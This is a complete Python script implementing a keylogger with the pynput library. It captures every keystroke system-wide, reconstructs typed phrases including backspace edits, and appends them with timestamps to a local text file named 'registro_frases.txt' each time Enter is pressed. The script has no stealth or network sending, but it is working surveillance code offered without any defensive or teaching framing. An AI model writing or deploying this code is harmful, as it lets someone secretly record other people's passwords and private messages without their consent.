import pynput.keyboard
import datetime
import signal

class Keylogger:
    def __init__(self, log_file="registro_frases.txt"):
        self.log_file = log_file
        self.current_keys = []

    def is_modifying_key(self, key):
        modifying_keys = [
            pynput.keyboard.Key.ctrl,
            pynput.keyboard.Key.alt,
            pynput.keyboard.Key.shift,
            pynput.keyboard.Key.cmd,
        ]
        return key in modifying_keys

    def on_press(self, key):
        if self.is_modifying_key(key):
            return

        try:
            char_key = key.char
            if char_key is not None:
                self.current_keys.append(char_key)
        except AttributeError:
            if key == pynput.keyboard.Key.space:
                self.current_keys.append(" ")
            elif key == pynput.keyboard.Key.enter:
                self.save_log()
                self.current_keys.clear()
            elif key == pynput.keyboard.Key.backspace:
                if self.current_keys:
                    self.current_keys.pop()
            elif str(key).startswith("Key."):
                pass
            else:
                self.current_keys.append(str(key))

    def on_release(self, key):
        if key == pynput.keyboard.Key.esc:
            return False

    def save_log(self):
        log_text = ''.join(self.current_keys)
        if log_text:
            with open(self.log_file, "a") as file:
                timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                file.write(f"{timestamp}: {log_text}\n")

    def start(self):
        with pynput.keyboard.Listener(on_press=self.on_press, on_release=self.on_release) as listener:
            try:
                listener.join()
            except KeyboardInterrupt:
                self.save_log()
                return

def ctrl_c_handler(signum, frame):
    keylogger.save_log()
    exit(0)

if __name__ == "__main__":
    keylogger = Keylogger()

    # Capturar Ctrl+C para terminar la ejecución de manera ordenada
    signal.signal(signal.SIGINT, ctrl_c_handler)

    keylogger.start()
